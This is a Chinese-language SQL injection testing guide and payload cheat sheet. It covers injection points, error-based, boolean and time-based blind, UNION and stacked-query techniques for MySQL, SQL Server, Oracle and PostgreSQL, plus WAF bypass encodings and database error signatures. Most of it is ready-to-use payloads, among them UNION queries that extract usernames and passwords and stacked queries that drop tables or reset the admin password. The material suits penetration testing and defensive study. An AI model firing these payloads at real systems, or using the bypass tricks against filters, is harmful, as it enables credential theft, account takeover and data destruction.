# SQL 注入测试指南

## 一、SQL 注入类型

### 1. 按注入位置分类

| 位置 | 说明 | 常见场景 |
|------|------|----------|
| GET 参数 | URL 查询字符串中的参数 | `?id=1`, `?name=admin` |
| POST 参数 | 表单提交的参数 | 登录表单、搜索框 |
| Cookie | Cookie 中的值 | 用户身份标识、会话信息 |
| HTTP Header | 请求头中的值 | `User-Agent`, `Referer`, `X-Forwarded-For` |
| JSON Body | JSON 请求体中的字段 | RESTful API |
| XML Body | XML 请求体中的节点 | SOAP 接口 |

### 2. 按注入类型分类

#### 2.1 字符型注入 (String-based)
参数被单引号或双引号包裹：
```sql
SELECT * FROM users WHERE name = '[用户输入]'
```

**测试 Payload:**
```
' OR '1'='1
" OR "1"="1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
```

#### 2.2 数字型注入 (Numeric-based)
参数直接拼接，无引号包裹：
```sql
SELECT * FROM users WHERE id = [用户输入]
```

**测试 Payload:**
```
1 OR 1=1
1 OR 1=1--
1 OR 1=1#
1) OR (1=1
-1 OR 1=1
```

#### 2.3 搜索型注入 (Search-based)
使用 LIKE 语句的模糊查询：
```sql
SELECT * FROM products WHERE name LIKE '%[用户输入]%'
```

**测试 Payload:**
```
%' OR '1'='1
%' OR 1=1--
%' AND '%'='
test%' AND '1'='1
```

## 二、注入检测技术

### 1. 基于错误的检测 (Error-based)

通过触发数据库错误来确认注入点：

**MySQL:**
```
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**SQL Server:**
```
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--
```

**Oracle:**
```
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--
```

**PostgreSQL:**
```
' AND 1=CAST((SELECT version()) AS int)--
```

### 2. 基于布尔的盲注 (Boolean-based Blind)

通过页面响应差异判断条件真假：

```
' AND 1=1--     (真条件，正常响应)
' AND 1=2--     (假条件，异常响应)

' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND (SELECT COUNT(*) FROM users)>0--
```

### 3. 基于时间的盲注 (Time-based Blind)

通过响应延迟判断条件真假：

**MySQL:**
```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--
```

**SQL Server:**
```
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

**PostgreSQL:**
```
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**Oracle:**
```
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
```

### 4. 联合查询注入 (UNION-based)

**确定列数:**
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
' UNION SELECT NULL,NULL,NULL--
```

**确定回显位置:**
```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
```

**提取数据:**
```
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,column_name,3 FROM information_schema.columns--
```

### 5. 堆叠查询注入 (Stacked Queries)

```
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

## 三、WAF 绕过技术

### 1. 大小写混合
```
SeLeCt * FrOm users
uNiOn SeLeCt 1,2,3
```

### 2. 注释绕过
```
SEL/**/ECT * FROM users
UN/**/ION SEL/**/ECT 1,2,3
/*!50000SELECT*/ * FROM users
```

### 3. 编码绕过

**URL 编码:**
```
%27%20OR%20%271%27%3D%271
%53%45%4C%45%43%54  (SELECT)
```

**双重 URL 编码:**
```
%252F%252A%252A%252F
```

**Unicode 编码:**
```
%u0027%u0020OR%u0020%u00271%u0027%u003D%u00271
```

**十六进制编码:**
```
SELECT 0x61646D696E  (admin)
```

### 4. 空格绕过
```
'/**/OR/**/1=1
'+OR+1=1
'%09OR%091=1  (Tab)
'%0AOR%0A1=1  (换行)
'%0COR%0C1=1  (换页)
'%0DOR%0D1=1  (回车)
'(1)OR(1)=(1)
```

### 5. 关键字绕过
```
UNION -> UNUNIONION
SELECT -> SELSELECTECT
OR -> || 或 oorr
AND -> && 或 aandnd
= -> LIKE 或 REGEXP
```

### 6. 函数替换
```
SUBSTRING -> MID, SUBSTR, LEFT, RIGHT
ASCII -> ORD, HEX
SLEEP -> BENCHMARK, GET_LOCK
```

## 四、常用测试 Payload 集合

### 基础检测
```
'
"
`
')
")
`)
'))
"))
`))
```

### 逻辑测试
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
' OR 1=1--
" OR "1"="1
" OR "1"="1"--
') OR ('1'='1
') OR ('1'='1'--
```

### 数学运算测试
```
1+1
2-1
1*1
1/1
1%1
```

### 特殊字符测试
```
\
\\
%00
%0A
%0D
```

## 五、响应分析

### 1. 可能存在注入的响应特征

- 数据库错误信息（MySQL, SQL Server, Oracle 等）
- 页面内容变化（布尔盲注）
- 响应时间明显延长（时间盲注）
- 返回数据量变化
- HTTP 状态码变化（200 -> 500）

### 2. 常见数据库错误信息

**MySQL:**
```
You have an error in your SQL syntax
Warning: mysql_fetch_array()
Warning: mysql_num_rows()
```

**SQL Server:**
```
Microsoft OLE DB Provider for SQL Server
Unclosed quotation mark
Microsoft SQL Native Client error
```

**Oracle:**
```
ORA-00933: SQL command not properly ended
ORA-01756: quoted string not properly terminated
```

**PostgreSQL:**
```
ERROR: syntax error at or near
pg_query(): Query failed
```

## 六、自动化测试建议

1. **先测试单引号** `'` 确认是否有响应变化
2. **确定注入类型**：字符型还是数字型
3. **确定闭合方式**：单引号、双引号、括号等
4. **确定注释方式**：`--`, `#`, `/**/`
5. **尝试提取数据**：先确定列数，再使用 UNION 注入
6. **如有 WAF**：尝试各种绕过技术

